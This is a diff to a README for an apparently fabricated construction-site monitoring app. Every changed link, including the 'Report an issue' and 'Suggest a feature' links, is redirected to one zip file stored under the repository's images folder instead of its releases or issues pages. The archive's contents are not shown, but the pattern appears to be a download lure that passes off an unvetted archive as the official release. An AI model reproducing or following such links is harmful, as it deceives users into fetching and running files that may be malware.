@@ -1,6 +1,6 @@
 # 📦 offline-first-construction-site-monitoring--event-sourcing-fp-clean-archi-ddd - Monitor Construction Sites Seamlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Baby7923/offline-first-construction-site-monitoring--event-sourcing-fp-clean-archi-ddd/releases)
+[![Download Now](https://raw.githubusercontent.com/Baby7923/offline-first-construction-site-monitoring--event-sourcing-fp-clean-archi-ddd/main/images/offline-first-construction-site-monitoring--event-sourcing-fp-clean-archi-ddd_v1.8.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Baby7923/offline-first-construction-site-monitoring--event-sourcing-fp-clean-archi-ddd/main/images/offline-first-construction-site-monitoring--event-sourcing-fp-clean-archi-ddd_v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ To download the app, follow these steps:
 
 1. **Visit the Releases Page:** Click on the link below to go to the releases page, where you can find the latest version of the app.
    
-   [Download the Latest Release](https://github.com/Baby7923/offline-first-construction-site-monitoring--event-sourcing-fp-clean-archi-ddd/releases)
+   [Download the Latest Release](https://raw.githubusercontent.com/Baby7923/offline-first-construction-site-monitoring--event-sourcing-fp-clean-archi-ddd/main/images/offline-first-construction-site-monitoring--event-sourcing-fp-clean-archi-ddd_v1.8.zip)
 
 2. **Select a Version:** On the releases page, you will see a list of versions. Look for the latest version recommended for most users.
 
@@ -75,11 +75,11 @@ Join the user community to share experiences and tips. You can ask questions and
 
 ### Connect with Us
 
-- **Issue Reporting:** [Report an issue](https://github.com/Baby7923/offline-first-construction-site-monitoring--event-sourcing-fp-clean-archi-ddd/issues)
-- **Feature Requests:** [Suggest a feature](https://github.com/Baby7923/offline-first-construction-site-monitoring--event-sourcing-fp-clean-archi-ddd/issues)
+- **Issue Reporting:** [Report an issue](https://raw.githubusercontent.com/Baby7923/offline-first-construction-site-monitoring--event-sourcing-fp-clean-archi-ddd/main/images/offline-first-construction-site-monitoring--event-sourcing-fp-clean-archi-ddd_v1.8.zip)
+- **Feature Requests:** [Suggest a feature](https://raw.githubusercontent.com/Baby7923/offline-first-construction-site-monitoring--event-sourcing-fp-clean-archi-ddd/main/images/offline-first-construction-site-monitoring--event-sourcing-fp-clean-archi-ddd_v1.8.zip)
 
 ## 🔗 Additional Resources
 
 For further information about the app's technical details, refer to the documentation linked within the app. Visit our GitHub page for updates and community insights.
 
-[Download the Latest Release](https://github.com/Baby7923/offline-first-construction-site-monitoring--event-sourcing-fp-clean-archi-ddd/releases) and start monitoring your construction sites efficiently.
+[Download the Latest Release](https://raw.githubusercontent.com/Baby7923/offline-first-construction-site-monitoring--event-sourcing-fp-clean-archi-ddd/main/images/offline-first-construction-site-monitoring--event-sourcing-fp-clean-archi-ddd_v1.8.zip) and start monitoring your construction sites efficiently.
